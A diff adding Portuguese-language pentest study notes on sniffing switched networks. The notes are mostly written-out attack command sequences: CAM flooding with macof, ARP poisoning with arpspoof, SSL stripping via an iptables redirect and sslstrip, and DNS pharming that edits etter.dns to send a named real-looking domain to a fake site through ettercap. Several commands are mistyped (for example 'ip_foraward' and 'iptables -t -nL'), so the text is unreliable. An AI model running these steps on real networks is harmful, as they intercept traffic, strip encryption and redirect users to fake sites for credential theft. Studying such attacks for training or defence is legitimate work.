@@ -1,0 +1,110 @@
+Sniffer
+=======
+
+ARP Spoofing
+------------
+Forma de sniffar em redes com switches
+
+- Flood da tabela CAM
+# macof
+
+- ARP Spoofing ou ARP Poison
+
+# arp -an
+# ping -c 1 192.168.1.108
+# arp -an
+
+# arp -d 192.168.1.108 <-- apaga o MAC da tabela
+
+# arpspoof -i <interface> -t <ip_alvo> <ip_gateway>
+
+# echo 1 > /proc/sys/net/ipv4/ip_foraward
+
+# arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 --> informando para o ip alvo que eu tenho o MAC para o ip do gateway
+# arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 --> informando para o ip do gateway que eu tenho o MAC para o ip do alvo
+
+# wireshark
+
+filtro
+ip.addr==192.168.1.1 and ip.addr==192.168.1.10
+
+observe os icmps redirect
+
+SSL Strip
+---------
+
+- Configurar o IP Forwarding
+# echo 1 > /proc/sys/net/ipv4/ip_foraward
+
+- Redirecionar o tráfego com netfilter
+# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+# iptables -t -nL
+
+
+- Realizar um ataque MiTM entre as 2 máquinas
+# arpspoof -i eth0 -t <ip_alvo> <ip_gateway>
+# arpspoof -i eth0 -t <ip_gateway> <ip_alvo>
+
+# ./sslstrip -a -l 8080
+
+# tail -f sslstip.log
+
+
+Principais protocolos que passam suas informações em texto puro (cleantext)
+
+- Telnet
+- RLogin
+- HTTP
+- SMTP
+- POP
+- FTP
+
+Sniffers
+--------
+- Dnisff
+- Ettercap
+- Cain & Abel
+- TCPDump
+- Wireshark
+- tshark
+
+TCPDump
+-------
+
+# tcpdump -i eth0
+# tcpdump -i eth0 src host 192.168.1.10
+# tcpdump -i eth0 dst host 192.168.1.1
+# tcpdump -i eth0 not host 192.168.1.2
+# tcpdump -i eth0 dst port 80
+# tcpdump -i eth0 src port 10222
+# tcpdump -i eth0 -n -s 1500 -c 10000 -w file.cap
+s --> quantidade de bytes do pacote (o padrão é 64)
+c --> quantidade de pacotes
+w --> armazenar em arquivo - nome do arquivo
+
+DNS Pharming
+------------
+
+Direciona o trafego para um outro endereço
+
+# cd /usr/share/ettarcap/
+# mv -f etter.dns etter.dns.old
+# vi etter.dns
+# * A <endereço ip> www.minha_bot.com.br
+www.clavis.com.br A 200.1.2.3 <-- endereço IP da OYS
+
+:wq
+
+* --> domínio ou ip que será redirecionado
+<endereço ip> --> IP do site falso
+<URL> --> URL do site falso
+
+# ettercap -i eth0 -T -q -P dns_spoof -M arp // //
+
+entre na máquina que está sendo atacada e abra um browser e digite o endereço
+http://www.clavis.com.br --> deverá aparecer o site da OYS
+
+
+
+
+
